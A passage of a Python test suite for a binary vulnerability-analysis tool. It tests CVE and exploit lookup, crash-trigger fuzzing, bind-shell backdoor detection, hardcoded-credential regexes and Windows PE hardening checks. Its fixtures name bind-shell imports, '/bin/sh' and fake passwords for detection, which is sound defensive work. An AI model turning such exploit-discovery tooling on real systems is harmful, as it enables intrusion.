        got = classify_binary(p)
        if isinstance(expect, tuple):
            assert got in expect, f"{name}: got {got}, expected one of {expect}"
        else:
            assert got == expect, f"{name}: got {got}, expected {expect}"


def test_classify_cve_accepts_canonical_ids():
    # classify_binary produce ids canonicos; classify_cve debe aceptarlos tal cual.
    from binoracle.workflows.cveplan import classify_cve
    for cid in ("stack-overflow", "heap-overflow", "uaf", "format-string", "oob-write"):
        assert classify_cve(cid) == cid


def test_exploitdb_github_crawl_graceful_and_render():
    # Las fuentes extra (GitHub PoC + searchsploit) no lanzan y devuelven [] con entrada invalida
    # (sin red). El render agrupa por fuente con conteo.
    from binoracle.workflows.cvelookup import (search_github_poc, search_searchsploit,
                                               render_cve_info, CVEInfo, ExploitRef)
    assert search_github_poc("no-es-cve") == []
    assert search_searchsploit("no-es-cve") == []
    pub = CVEInfo(cve_id="CVE-2099-0003", ok=True, description="stack overflow",
                  has_public_exploit=True,
                  exploit_refs=[ExploitRef(url="https://github.com/a/b", source="github"),
                                ExploitRef(url="https://github.com/c/d", source="github"),
                                ExploitRef(url="https://www.exploit-db.com/exploits/9", source="exploit-db", edb_id="9")])
    md = render_cve_info(pub, "es")
    assert "SI consta" in md and "github: 2" in md and "exploit-db: 1" in md
    gap = CVEInfo(cve_id="CVE-2099-0004", ok=True, description="heap overflow")
    assert "posible hueco" in render_cve_info(gap, "es")


def test_cve_agent_deterministic_render():
    # El agente de investigacion funciona sin LLM (via determinista): render con clase, bloqueos y
    # el exploit desarrollado. Maneja steps como dicts del modelo y el estado de lookup.
    from binoracle.workflows.cve_agent import Investigation, render_investigation
    inv = Investigation(cve_id="CVE-2024-33599", description="nscd stack-based buffer overflow",
                        lookup_ok=True, is_gap=True, vuln_class="stack-overflow",
                        llm_notes={"target_binary": "nscd", "trigger": "netgroup request",
                                   "steps": [{"step": "exhaust cache"}, "overflow"]},
                        developed_script="from pwn import *\nio=process('./t')",
                        blockers=["falta nscd", "falta disparador"])
    md = render_investigation(inv, "es")
    assert "CVE-2024-33599" in md and "HUECO" in md and "stack-overflow" in md
    assert "nscd" in md and "exhaust cache" in md            # step dict aplanado
    assert "Bloqueos" in md and "from pwn import *" in md
    # exploit verificado se muestra como tal
    inv2 = Investigation(cve_id="CVE-1-1", lookup_ok=True, verified=True, verified_detail="offset=88")
    assert "VERIFICADO" in render_investigation(inv2, "es")


def test_dockerfetch_render_and_guard():
    # render + validacion de entrada sin tocar Docker/red.
    from binoracle.workflows.dockerfetch import fetch_from_image, render_fetch, FetchResult
    r = fetch_from_image("", "", on_step=lambda m: None)   # sin imagen/ruta -> falla limpio
    assert r.ok is False and r.note
    ok = FetchResult(ok=True, image="debian:12", src_path="/usr/bin/whoami",
                     local_path="/tmp/fetched/whoami")
    md = render_fetch(ok, "es")
    assert "Binario extraido" in md and "debian:12" in md and "investigate" in md
    bad = render_fetch(FetchResult(ok=False, note="no se hallo", candidates=["/a", "/b"]), "es")
    assert "fallida" in bad.lower() and "/a" in bad


def test_autofuzz_render_and_result():
    # render del descubridor de disparador + propiedad crashed sin tocar docker.
    from binoracle.workflows.autofuzz import FuzzResult, Trigger, render_fuzz
    r = FuzzResult(ok=True, binary="/x/ret2win",
                   triggers=[Trigger("stdin", "stack-overflow", min_size=128, exit_code=139,
                                     evidence="crash con 128 bytes")])
    assert r.crashed
    md = render_fuzz(r, "es")
    assert "stdin" in md and "stack-overflow" in md and "128" in md
    empty = FuzzResult(ok=False, note="sin crash")
    assert "sin crash" in render_fuzz(empty, "es") and empty.crashed is False
    # cyclic fallback no lanza sin pwntools
    from binoracle.workflows.autofuzz import _cyclic
    assert len(_cyclic(100)) == 100


def test_autofuzz_expand_tokens():
    # Regresion: _expand usa `re` (PAD/CYCLIC) - un import faltante rompia TODO caso dirigido
    # silenciosamente (capturado por el except generico de directed_fuzz). Debe expandir de verdad.
    from binoracle.workflows.autofuzz import _expand
    assert _expand("-s {PAD:5}\\") == b"-s AAAAA\\"
    assert _expand("x{CYCLIC:8}y") == b"xaaaabaaay"
    assert _expand(None) == b""
    assert _expand(b"raw") == b"raw"
    assert _expand("plain") == b"plain"


def test_directed_fuzz_without_llm():
    # Sin LLM disponible, directed_fuzz no lanza y deja nota clara (no falso "ok").
    from binoracle.workflows.autofuzz import directed_fuzz

    class _Unavailable:
        def available(self):
            return False

    res = directed_fuzz("/nonexistent-binary-xyz", "hint", _Unavailable())
    assert res.ok is False and "no encontrado" in res.note

    class _NoLLM:
        pass
    res2 = directed_fuzz(__file__, "hint", None)
    assert res2.ok is False and "sin LLM" in res2.note


def test_shares_caller_same_vs_different_function():
    # shares_caller exige que dos simbolos esten llamados desde la MISMA funcion (via r2_xrefs), no
    # solo que ambos existan en el binario -- distingue flujo de datos real (mismo camino de codigo)
    # de mera co-presencia (que fue el origen de FPs en injection.py/backdoors.py: p.ej. un system()
    # de cadena FIJA en un 'win()' de CTF, sin relacion con un gets() en main()).
    from binoracle.workflows._binfacts import shares_caller, callers_of
    same = _mock_reg(imports="sym.imp.sprintf\nsym.imp.system", same_func=True)
    assert shares_caller(same, ["sprintf"], ["system"]) is True
    assert callers_of(same, "sprintf") == {"main"}
    diff = _mock_reg(imports="sym.imp.gets\nsym.imp.system", same_func=False)
    assert shares_caller(diff, ["gets"], ["system"]) is False


def test_backdoors_requires_same_function_not_just_presence():
    # Regresion: el patron 'socket+bind+listen+exec en el binario' ya NO basta si estan en funciones
    # SIN relacion (p.ej. un servidor legitimo + un helper de backup que hace exec en otro sitio).
    same = _mock_reg(imports="sym.imp.socket\nsym.imp.bind\nsym.imp.listen\nsym.imp.execve",
                     strings="/bin/sh", same_func=True)
    from binoracle.workflows.backdoors import scan_backdoors
    titles_same = " ".join(f.title.lower() for f in scan_backdoors(same, "x"))
    assert "bind shell" in titles_same
    diff = _mock_reg(imports="sym.imp.socket\nsym.imp.bind\nsym.imp.listen\nsym.imp.execve",
                     strings="/bin/sh", same_func=False)
    assert scan_backdoors(diff, "x") == []          # sin coocurrencia real -> sin hallazgo


def test_authcheck_cred_regex_boundaries():
    # Regresion: sin limite alguno, "pin" hacia match dentro de "GetStartupInfoA" (API de Windows,
    # nada que ver con credenciales) -- confirmado en win_chall.exe. Con \b clasico se habria roto
    # el caso real "MASTER_PASSWORD_2024" (guion bajo cuenta como \w, no separa). El limite correcto
    # es 'sin letra adyacente' (digitos/guion bajo/inicio/fin si cuentan como frontera de palabra).
    from binoracle.workflows.authcheck import _CRED, _PROMPT_ONLY
    assert not _CRED.search("GetStartupInfoA")
    assert not _CRED.search("LPSTARTUPINFOA")
    assert _CRED.search("MASTER_PASSWORD_2024xk")
    assert _CRED.search("AUTH_TOKEN_XYZ123")
    # prompts de UI (solo la etiqueta, sin valor real) se filtran aparte
    assert _PROMPT_ONLY.match("pass?")
    assert _PROMPT_ONLY.match("login:")
    assert not _PROMPT_ONLY.match("MASTER_PASSWORD_2024xk")


def test_authcheck_no_false_positive_on_windows_binary():
    # Regresion sobre binario real: win_chall.exe (PE) tiene STARTUPINFOA/LPSTARTUPINFOA en sus
    # strings (metadatos de arranque de Windows) que antes disparaban 'credencial hardcodeada' por
    # contener "pin" como substring sin limites, y "pass?" (un prompt de UI, no una credencial).
    # Ninguna de las dos debe producir un hallazgo.
    import os
    from binoracle.oracles import build_registry
    from binoracle.workflows.authcheck import scan_auth
    b = "samples/bin/win_chall.exe"
    if not os.path.exists(b):
        return
    reg = build_registry(b)
    fs = scan_auth(reg, b, "es")
    assert fs == [], [f.title for f in fs]


def test_web_md_to_html_renders_bold_tables_ordered_lists():
    # Regresion: la Biblioteca de Conocimiento (Conocimiento/kb) mostraba **negrita** literal y
    # tablas markdown como un parrafo ilegible de '|' sueltos -- confirmado en owasp-desktop.md
    # (tabla de 10 filas) y en 9/47 cheat sheets con **negrita**.
    from binoracle.web import _md_to_html
    html = _md_to_html("**bold** and *italic*\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n"
                       "1. paso uno\n2. paso dos\n")
    assert "<strong>bold</strong>" in html and "<em>italic</em>" in html
    assert "**" not in html
    assert "<table>" in html and "<th>A</th>" in html and "<td>1</td>" in html
    assert "|" not in html.replace("<td>", "").replace("</td>", "")  # sin pipes sueltos en prosa
    assert "<ol>" in html and "<li>paso uno</li>" in html


def test_report_md_rich_renders_lists_and_tables():
    # Regresion: _md_rich (usado por Investigar/Entrenar/Dataset) mostraba cada '- item' como un
    # <p> con guion literal, sin <ul>/<ol> real -- confirmado en el informe de 'Investigar (LLM)'.
    from binoracle.report.html import _md_rich
    html = _md_rich("## Titulo\n- **clave**: valor\n- otro item\n\n1. paso uno\n2. paso dos\n\n"
                    "| ID | Nombre |\n|----|--------|\n| 1 | x |\n")
    assert "<ul><li><strong>clave</strong>: valor</li>" in html
    assert "<ol><li>paso uno</li>" in html
    assert "<table>" in html and "<th>ID</th>" in html
    assert "**" not in html
    assert not __import__("re").search(r"<p>\s*-\s", html)   # sin guiones literales en <p>


def test_chainanalyzer_facts_word_boundaries():
    # Regresion (hallada por un subagente de auditoria): _facts() marcaba "win" dentro de
    # "_unwind_resume" (el runtime de excepciones de C++/libgcc_s, presente en CUALQUIER binario
    # con try/catch) como si fuera la funcion win()/gift del reto -- fabricando un objetivo de
    # ret2win inexistente. Tambien: "puts" in texto matcheaba "fputs" (substring), marcando puts()
    # como disponible para la fuga cuando solo hay fputs(); y el chequeo de reentrada usaba
    # substring sobre un grep en vez de igualdad exacta de nombre de funcion.
    import json
    from unittest.mock import patch
    from binoracle.workflows.chainanalyzer import _facts, _overflow_sink

    class _FakeR2:
        def __init__(self, cmds): self.cmds = cmds
        def cmd(self, c):
            for prefix, out in self.cmds.items():
                if c.startswith(prefix):
                    return out
            return ""

    # 'win' NO debe matchear dentro de _Unwind_Resume (solo funciones de C++/libgcc_s presentes)
    fns = json.dumps([{"name": "main", "offset": 4096},
                      {"name": "sym.imp._Unwind_Resume", "offset": 8192}])
    r2 = _FakeR2({"ij": json.dumps({"bin": {}}), "aflj": fns, "iij": "[]", "izzj": "{}"})
    with patch("binoracle.oracles.r2session.get", return_value=r2):
        f = _facts("/nonexistent")
    assert f["win"] is None, "'win' hizo match dentro de _Unwind_Resume"

    # 'puts' NO debe marcarse presente si solo hay 'fputs' (substring de 'puts')
    imps = json.dumps([{"name": "sym.imp.fputs"}])
    r2b = _FakeR2({"ij": json.dumps({"bin": {}}), "aflj": "[]", "iij": imps, "izzj": "{}"})
    with patch("binoracle.oracles.r2session.get", return_value=r2b):
        fb = _facts("/nonexistent")
    assert fb["puts"] is False and fb["leak_fn"] is None

    # 'gets' NO debe matchear dentro de la disassembly de una funcion que solo llama a getsockopt
    fns2 = json.dumps([{"name": "sym.check_sock", "offset": 4096}])
    r2c = _FakeR2({"aflj": fns2, "pdf @ sym.check_sock": "call sym.imp.getsockopt"})
    with patch("binoracle.oracles.r2session.get", return_value=r2c):
        sink = _overflow_sink("/nonexistent")
    assert sink is None, "'gets' hizo match dentro de getsockopt"


def test_chainanalyzer_overflow_sink_never_hangs_on_a_stuck_pdf(monkeypatch):
    # Bug real encontrado en vivo (barrido "poco a poco" tras el fix de reachability.
    # _sink_callsites): _overflow_sink recorria TODAS las funciones de `aflj` llamando a
    # `r.cmd(f"pdf @ {nm}")` sin ningun cap de cantidad/tiempo ni timeout por llamada -- una
    # sola funcion que cuelga `pdf` (misma familia que `axtj` sobre un simbolo problematico)
    # bloqueaba la deteccion entera. Ahora debe acotar con el mismo patron de 400/20s ya usado
    # en el bucle equivalente de este mismo archivo.
    import time
    import json as _json
    from binoracle.workflows import chainanalyzer as ca
    from binoracle.oracles import r2session

    class _FakeProc:
        def __init__(self):
            self.killed = False
        def kill(self):
            self.killed = True

    class _StuckR2:
        def __init__(self):
            self.process = _FakeProc()
        def cmd(self, c):
            if c == "aflj":
                return _json.dumps([{"name": "sym.stuck_fn"}, {"name": "sym.other_fn"}])
            if c.startswith("pdf @ sym.stuck_fn"):
                time.sleep(600)   # mucho mas que el timeout real de 15s por llamada
            return ""
    fake = _StuckR2()
    monkeypatch.setattr(r2session, "get", lambda binary: fake)

    t0 = time.time()
    sink = ca._overflow_sink("fake.bin")
    elapsed = time.time() - t0
    assert elapsed < 30.0, "una sola funcion con pdf colgado no debe bloquear toda la deteccion"
    assert sink is None
    assert fake.process.killed, "la sesion colgada debe matarse, no quedar zombie"


def test_analyze_chains_not_applicable_for_non_elf_binaries():
    # BUG real encontrado revisando un informe generado contra un .exe de Windows real
    # (Ingrid.exe, PE32 x86 32-bit): analyze_chains() generaba (y con verify=True, intentaba
    # VERIFICAR EN SANDBOX) cadenas puramente ELF/glibc -- "tcache dup -> free@GOT=system()",
    # "execve syscall", strings '/bin/sh' -- para un binario donde nada de eso existe (PE no
    # tiene GOT/PLT ni tcache; Windows no tiene glibc). Ademas de enganoso en el informe, cada
    # intento de verificacion es una tanda de docker que nunca puede tener exito: tiempo tirado.
    # Fix: _facts() ahora lee `bintype` (via 'ij'), y analyze_chains() corta ANTES de enumerar
    # gadgets o construir ninguna cadena si el binario no es ELF.
    from unittest.mock import patch
    from binoracle.workflows import chainanalyzer

    fake_facts = {"bintype": "pe", "arch": "x86_32", "canary": True, "pie": False, "nx": True,
                  "win": None, "system": None, "binsh": None, "rip_offset": 100}
    with patch.object(chainanalyzer, "_facts", return_value=fake_facts):
        an = chainanalyzer.analyze_chains("samples/bin/ret2win", None, verify=True, lang="es")
    assert an.applicable is False
    assert an.chains == []
    assert an.gadgets == []          # ni siquiera se enumeraron gadgets: corte antes de eso
    assert "pe" in an.note.lower()

    # un ELF real (bintype=elf, o no detectado -- None se trata como aplicable) SI debe seguir
    # construyendo cadenas con normalidad: no se ha cambiado el comportamiento para el caso normal.
    an_elf = chainanalyzer.analyze_chains("samples/bin/ret2win", None, verify=False, lang="es")
    assert an_elf.applicable is True
    assert an_elf.chains, "un ELF real no deberia perder sus cadenas por este cambio"


def test_pe_capability_map_classifies_imports_by_category():
    # Fase 2 de una auditoria PE (pedida explicitamente): clasificar el binario por lo que PUEDE
    # hacer (red/proceso/privilegios/cripto/registro/ficheros) a partir de sus imports, antes de
    # leer ninguna funcion.
    from binoracle.report.html import _pe_capability_map, _capability_html

    class _FakeTriage:
        sections = [("Imports", "radare2: ii",
                     "nth vaddr      bind type lib            name\n"
                     "----------------------------------------------\n"
                     "1   0x00abe1f4 NONE FUNC KERNEL32.dll   CreateProcessA\n"
                     "2   0x00abe1f8 NONE FUNC WININET.dll    InternetOpenA\n"
                     "3   0x00abe1fc NONE FUNC ADVAPI32.dll   RegCreateKeyExA\n"
                     "4   0x00abe200 NONE FUNC ADVAPI32.dll   AdjustTokenPrivileges\n"
                     "5   0x00abe204 NONE FUNC ADVAPI32.dll   CryptAcquireContextA\n")]

    cm = _pe_capability_map(_FakeTriage())
    assert cm["red"] == ["InternetOpenA"]
    assert "CreateProcessA" in cm["proceso"]
    assert cm["privilegios"] == ["AdjustTokenPrivileges"]
    assert cm["registro"] == ["RegCreateKeyExA"]
    assert cm["cripto"] == ["CryptAcquireContextA"]
    html = _capability_html(cm, "es")
    assert "InternetOpenA" in html and "AdjustTokenPrivileges" in html

    # sin imports reconocidos (o sin seccion de Imports): no debe reventar, solo no clasificar nada
    class _EmptyTriage:
        sections = [("Imports", "radare2: ii", "(no imports)")]
    assert _pe_capability_map(_EmptyTriage()) == {}
    assert _capability_html({}, "es") == ""


def test_pe_capability_map_exact_match_for_short_socket_names():
    # BUG real encontrado con un PE real (Ingrid.exe): 'SendMessageA' (mensajeria de ventanas,
    # user32, nada que ver con red) caia en la categoria "Red" solo por empezar por "send" (los
    # nombres BSD-socket clasicos -- send/recv/connect/bind/listen/accept/socket -- son
    # demasiado cortos para prefix-match sin choques). Deben exigir coincidencia EXACTA; los
    # nombres largos y especificos (InternetOpen, WinHttpConnect...) siguen siendo prefix-match.
    from binoracle.report.html import _pe_capability_map

    class _FakeTriage:
        sections = [("Imports", "radare2: ii",
                     "1 0x1 NONE FUNC USER32.dll  SendMessageA\n"
                     "2 0x2 NONE FUNC WS2_32.dll   send\n"
                     "3 0x3 NONE FUNC WS2_32.dll   connect\n"
                     "4 0x4 NONE FUNC WS2_32.dll   ConnectNamedPipe\n")]

    cm = _pe_capability_map(_FakeTriage())
    assert "SendMessageA" not in cm.get("red", [])
    assert "ConnectNamedPipe" not in cm.get("red", [])
    assert cm["red"] == ["connect", "send"]


def test_pe_dll_characteristics_decodes_mitigation_bits():
    # ASLR/DEP/CFG de Windows viven en IMAGE_OPTIONAL_HEADER.DllCharacteristics, no en ningun
    # campo de checksec -- hay que decodificar los bits IMAGE_DLLCHARACTERISTICS_* a mano.
    from unittest.mock import patch
    from binoracle.report.html import _pe_dll_characteristics

    class _FakeR2:
        def __init__(self, header_text):
            self.header_text = header_text
        def cmd(self, c):
            if c == "iHj":
                import json
                return json.dumps({"header": self.header_text})
            return ""

    # DYNAMIC_BASE (0x40) + NX_COMPAT (0x100) + GUARD_CF (0x4000) = 0x4140: los 3 activos
    r2 = _FakeR2("IMAGE_OPTIONAL_HEADERS\n  DllCharacteristics : 0x4140\n")
    with patch("binoracle.oracles.r2session.get", return_value=r2):
        pe = _pe_dll_characteristics("/nonexistent")
    assert pe == {"ASLR": True, "DEP": True, "CFG": True}

    # solo TERMINAL_SERVER_AWARE (0x8000): ninguna de las 3 mitigaciones activa
    r2b = _FakeR2("IMAGE_OPTIONAL_HEADERS\n  DllCharacteristics : 0x8000\n")
    with patch("binoracle.oracles.r2session.get", return_value=r2b):
        pe_off = _pe_dll_characteristics("/nonexistent")
    assert pe_off == {"ASLR": False, "DEP": False, "CFG": False}


def test_pe_packing_check_flags_high_entropy_and_known_packer_sections():
    # Fase 0: si el binario esta empaquetado, el resto del analisis estatico ve el stub del
    # packer, no el programa real -- hay que avisar ANTES que de cualquier otra cosa. Umbral
    # empirico de entropia ~7.0 (comprimido/cifrado), mas nombres de seccion de packers conocidos.
    from unittest.mock import patch
    from binoracle.report.html import _pe_packing_check, _packing_warning_html
    import json

    class _FakeR2:
        def __init__(self, secs): self.secs = secs
        def cmd(self, c):
            return json.dumps(self.secs) if c == "iSj entropy" else ""

    # seccion .text con entropia normal (codigo) + UPX0 vacia (tipico de UPX) -> ambos indicios
    secs = [{"name": ".text", "entropy": "4.06"}, {"name": "UPX0", "entropy": "0.01"},
            {"name": "UPX1", "entropy": "7.85"}]
    with patch("binoracle.oracles.r2session.get", return_value=_FakeR2(secs)):
        pk = _pe_packing_check("/nonexistent")
    assert ("UPX0", "UPX") in pk["packer_sections"]
    assert ("UPX1", "UPX") in pk["packer_sections"]
    assert any(name == "UPX1" for name, _ent in pk["high_entropy"])
    html = _packing_warning_html(pk, "es")
    assert "UPX" in html

    # binario normal, sin packer ni entropia alta: no debe generar ningun aviso
    secs_clean = [{"name": ".text", "entropy": "4.06"}, {"name": ".rsrc", "entropy": "2.30"}]
    with patch("binoracle.oracles.r2session.get", return_value=_FakeR2(secs_clean)):
        pk_clean = _pe_packing_check("/nonexistent")
    assert pk_clean == {}
    assert _packing_warning_html(pk_clean, "es") == ""


def test_pe_packing_check_flags_low_function_count():
    # Fase 0 (metodologia PE pegada por el usuario): "contar las funciones detectadas (afl~?)"
    # como senal ADICIONAL de empaquetado -- un binario grande con muy pocas funciones es tipico
    # del stub de un packer (el programa real esta comprimido/cifrado, r2 no ve codigo ahi).
    from unittest.mock import patch
    from binoracle.report.html import _pe_packing_check, _packing_warning_html
    import json

    class _FakeR2:
        def __init__(self, secs, nfcn): self.secs = secs; self.nfcn = nfcn
        def cmd(self, c):
            if c == "iSj entropy":
                return json.dumps(self.secs)
            if c == "aflc":
                return str(self.nfcn)
            return ""

    secs_clean = [{"name": ".text", "entropy": "4.06"}]
    # binario grande (por encima del umbral) con solo 5 funciones detectadas -> sospechoso
    with patch("binoracle.oracles.r2session.get", return_value=_FakeR2(secs_clean, 5)), \
         patch("os.path.getsize", return_value=1_000_000):
        pk = _pe_packing_check("/nonexistent")
    assert pk.get("low_fncount") == (5, 1_000_000)
    html = _packing_warning_html(pk, "es")
    assert "5" in html and "funciones" in html

    # mismo recuento bajo pero binario PEQUENO (por debajo del umbral de tamano): no es senal,
    # cualquier programa pequeno tiene pocas funciones de forma legitima
    with patch("binoracle.oracles.r2session.get", return_value=_FakeR2(secs_clean, 5)), \
         patch("os.path.getsize", return_value=5_000):
        pk_small = _pe_packing_check("/nonexistent")
    assert pk_small == {}

    # binario grande con muchas funciones (normal): tampoco es senal
    with patch("binoracle.oracles.r2session.get", return_value=_FakeR2(secs_clean, 800)), \
         patch("os.path.getsize", return_value=1_000_000):
        pk_normal = _pe_packing_check("/nonexistent")
    assert pk_normal == {}


def test_pe_capability_map_has_database_category():
    # Fase 2 de la metodologia pegada por el usuario pide explicitamente "¿Tiene acceso a bases de
    # datos?" como una categoria del mapa de capacidades, junto a red/proceso/privilegios/cripto/
    # registro -- faltaba.
    from binoracle.report.html import _pe_capability_map

    class _FakeTriage:
        sections = [("Imports", "radare2: ii",
                     "1 0x1 NONE FUNC ODBC32.dll   SQLDriverConnect\n"
                     "2 0x2 NONE FUNC ODBC32.dll   SQLExecDirect\n"
                     "3 0x3 NONE FUNC KERNEL32.dll GetLastError\n")]

    cm = _pe_capability_map(_FakeTriage())
    assert cm.get("bd") == ["SQLDriverConnect", "SQLExecDirect"]


def test_pe_capability_map_falls_back_to_pefile_when_r2_imports_empty():
    # Fase 0 de la metodologia: "si ii/iij de r2 falla, no asumir que el binario no tiene tabla de
    # importaciones -- probar readpe/pefile antes de concluir nada". Si el texto de imports de r2
    # viene vacio (parser atragantado, PE raro), el mapa de capacidades debe caer a pefile en vez
    # de devolver {} silenciosamente.
    from unittest.mock import patch, MagicMock
    from binoracle.report.html import _pe_capability_map

    class _FakeTriageEmpty:
        sections = [("Imports", "radare2: ii", "")]

    fake_import = MagicMock()
    fake_import.name = b"InternetOpenA"
    fake_entry = MagicMock()
    fake_entry.imports = [fake_import]
    fake_pe = MagicMock()
    fake_pe.DIRECTORY_ENTRY_IMPORT = [fake_entry]

    with patch("pefile.PE", return_value=fake_pe):
        cm = _pe_capability_map(_FakeTriageEmpty(), binary="/nonexistent.exe")
    assert cm.get("red") == ["InternetOpenA"]

    # sin binario para el fallback: sigue devolviendo {} (no puede hacer nada mas)
    assert _pe_capability_map(_FakeTriageEmpty()) == {}


def test_pe_dll_hijack_check_flags_known_hijackable_dll_unless_hardened():
    # Checklist base pegada por el usuario: "DLL hijacking - se utilizan rutas relativas?". Senal
    # practica: importa una DLL de las que Windows carga por busqueda de nombre (conocida en
    # investigaciones publicas de sideloading) SIN usar SetDllDirectory/SetDefaultDllDirectories
    # para fijar su propia ruta de busqueda.
    from binoracle.report.html import _pe_dll_hijack_check, _dll_hijack_html

    class _FakeTriageVulnerable:
        sections = [("Imports", "radare2: ii",
                     "1 0x1 NONE FUNC VERSION.dll  GetFileVersionInfoA\n"
                     "2 0x2 NONE FUNC UXTHEME.dll  SetWindowTheme\n"
                     "3 0x3 NONE FUNC KERNEL32.dll LoadLibraryA\n")]

    res = _pe_dll_hijack_check(_FakeTriageVulnerable())
    assert res["dlls"] == ["uxtheme.dll", "version.dll"]
    html = _dll_hijack_html(res, "es")
    assert "version.dll" in html and "uxtheme.dll" in html

    # mismas DLLs pero el binario SI fija su propia ruta de busqueda -> se considera endurecido
    class _FakeTriageHardened:
        sections = [("Imports", "radare2: ii",
                     "1 0x1 NONE FUNC VERSION.dll   GetFileVersionInfoA\n"
                     "2 0x2 NONE FUNC KERNEL32.dll  SetDllDirectoryW\n")]

    assert _pe_dll_hijack_check(_FakeTriageHardened()) == {}

    # sin ninguna DLL de la lista conocida: nada que avisar
    class _FakeTriageClean:
        sections = [("Imports", "radare2: ii", "1 0x1 NONE FUNC KERNEL32.dll GetLastError\n")]

    assert _pe_dll_hijack_check(_FakeTriageClean()) == {}
    assert _dll_hijack_html({}, "es") == ""


def test_pe_pdb_leak_extracts_debug_directory_path():
    # Checklist base pegada por el usuario: "filtracion de informacion sensible en strings...
    # rutas de compilacion". El PE Debug Directory (CodeView/RSDS) suele embeber la ruta absoluta
    # al .pdb tal cual quedo en la maquina de build. r2 no expone este directorio, por eso pefile.
    from unittest.mock import patch, MagicMock
    from binoracle.report.html import _pe_pdb_leak, _pdb_leak_html

    fake_cv_entry = MagicMock()
    fake_cv_entry.PdbFileName = b"C:\\build\\agent1\\src\\Release\\Ingrid.pdb\x00\x00"
    fake_debug_entry = MagicMock()
    fake_debug_entry.entry = fake_cv_entry
    fake_pe = MagicMock()
    fake_pe.DIRECTORY_ENTRY_DEBUG = [fake_debug_entry]

    with patch("pefile.PE", return_value=fake_pe):
        res = _pe_pdb_leak("/nonexistent.exe")
    assert res["pdb_path"] == "C:\\build\\agent1\\src\\Release\\Ingrid.pdb"
    html = _pdb_leak_html(res, "es")
    assert "Ingrid.pdb" in html

    # sin debug directory (release limpio, caso comun): no hay nada que avisar
    fake_pe_clean = MagicMock()
    fake_pe_clean.DIRECTORY_ENTRY_DEBUG = []
    with patch("pefile.PE", return_value=fake_pe_clean):
        assert _pe_pdb_leak("/nonexistent.exe") == {}
    assert _pdb_leak_html({}, "es") == ""


def test_win32_constant_annotations_resolves_known_apis_only():
    # Fase 4 de la metodologia pegada por el usuario: "cualquier numero magico que aparezca en
    # una llamada a una API de Windows se debe verificar contra la documentacion oficial antes de
    # interpretarse". Implementado DETERMINISTA (tabla curada, no el LLM adivinando), por familia
    # de API para no confundir valores que colisionan entre APIs (0x80000000 es GENERIC_READ en
    # CreateFile pero HKEY_CLASSES_ROOT en el registro).
    from binoracle.report.html import _win32_constant_annotations, _win32_constants_html

    code = (
        'HANDLE h = CreateFileA(path, 0x80000000, 0, 0, 3, 0, 0);\n'
        'LPVOID p = VirtualAlloc(0, 0x1000, 0x3000, 0x40);\n'
        'RegOpenKeyExA(0x80000002, sub, 0, 0, &hk);\n'
        'int x = 42;  // literal suelto, sin API conocida en la linea: no debe anotarse\n'
    )
    hits = _win32_constant_annotations(code)
    assert ("createfile", "0x80000000", "GENERIC_READ") in hits
    assert ("createfile", "3", "OPEN_EXISTING") in hits
    assert ("virtualalloc", "0x1000", "MEM_COMMIT") in hits
    assert ("virtualalloc", "0x3000", "MEM_COMMIT|MEM_RESERVE") in hits
    assert ("virtualalloc", "0x40", "PAGE_EXECUTE_READWRITE") in hits
    assert ("regopenkey", "0x80000002", "HKEY_LOCAL_MACHINE") in hits
    assert not any(h[1] == "42" for h in hits)

    html = _win32_constants_html(hits, "es")
    assert "GENERIC_READ" in html and "HKEY_LOCAL_MACHINE" in html

    # mismo valor 0x80000000, API distinta (registro, no CreateFile) -> simbolo distinto, sin
    # colision entre tablas
    reg_only = _win32_constant_annotations("RegCreateKeyExA(0x80000000, name, 0, 0, 0, 0, 0, &hk, 0);")
    assert reg_only == [("regcreatekey", "0x80000000", "HKEY_CLASSES_ROOT")]

    # sin ninguna API Win32 conocida en el texto: nada que anotar
    assert _win32_constant_annotations("int add(int a, int b) { return a + b; }") == []
    assert _win32_constants_html([], "es") == ""


def test_methodology_html_documents_every_phase_honestly():
    # Peticion explicita del usuario: que la metodologia (Fases 0-9 + checklist) quede "toda
    # representada y bien documentada" en el informe, no solo aplicada en silencio. Debe ser
    # honesta: nunca afirmar cobertura de una fase que no existe en el binario concreto (p.ej. no
    # decir "cadena completa" si no hay seccion de cadena de ataque para ESTE informe).
    from binoracle.report.html import _methodology_html

    # PE con todas las secciones presentes: fases 0/2 (especificas de PE) + 3/4/5/6/7/8/9
    has_full = {"dec": True, "chain": True, "owasp": True}
    html = _methodology_html(True, has_full, "es")
    for phase in ("Fase 0", "Fase 2", "Fase 3", "Fase 4", "Fase 5", "Fase 6", "Fase 7", "Fase 9"):
        assert phase in html
    assert "sandbox de verificacion dinamica" in html and "Linux/ELF-only" in html  # Fase 8 honesta en PE
    assert "MSI" in html and "DISABLEROLLBACK" in html  # checklist MSI: documentado, no fingido

    # ELF: no debe reclamar Fase 0/2 (especificas de PE: Rich Header, capacidades Win32...)
    html_elf = _methodology_html(False, has_full, "es")
    assert "Fase 0" not in html_elf and "Fase 2" not in html_elf
    assert "sandbox aislado interceptando" in html_elf  # Fase 8 distinta para ELF (si se ejecuta)

    # sin decompilacion ni cadena ni OWASP en este binario concreto: el texto debe decirlo, no
    # fingir que si se cubrio
    has_empty = {"dec": False, "chain": False, "owasp": False}
    html_empty = _methodology_html(True, has_empty, "es")
    assert "no se pudo decompilar" in html_empty
    assert "no hay suficientes hallazgos" in html_empty
    assert "sin hallazgos que mapear" in html_empty


def _mock_tool(ok=True, data="", meta=None):
    from unittest.mock import MagicMock
    t = MagicMock()
    t.run.return_value = MagicMock(ok=ok, data=data, meta=meta or {})
    return t


def test_secrets_scan_finds_the_real_using_function_via_xref():
    # Limitacion real senalada por el usuario: secrets.py devolvia SIEMPRE la misma location fija
    # ("seccion de datos"), sin decir en que funcion se usa la credencial. Ahora usa r2 axt sobre
    # el vaddr de la string (columna 3 de la tabla `izz`) para decir la funcion REAL que la
    # referencia, cuando r2 puede determinarla -- y es honesto (no inventa) cuando no puede.
    from unittest.mock import MagicMock
    from binoracle.workflows.secrets import scan_secrets

    def make_reg(xref_data):
        reg = MagicMock()
        strings_tool = _mock_tool(data="0   0x00000318 0x00400318 27  28   .rodata ascii "
                                        "password=SuperSecret123\n")
        xrefs_tool = _mock_tool(data=xref_data)
        reg.get.side_effect = lambda name: {"r2_strings": strings_tool, "r2_xrefs": xrefs_tool}.get(name)
        return reg

    # con xref real: location dice la funcion, no el generico fijo de antes
    fs = scan_secrets(make_reg("sym.check_login 0x401177 [STRN:r--] mov edi, str.password"), "fake", "es")
    assert len(fs) == 1
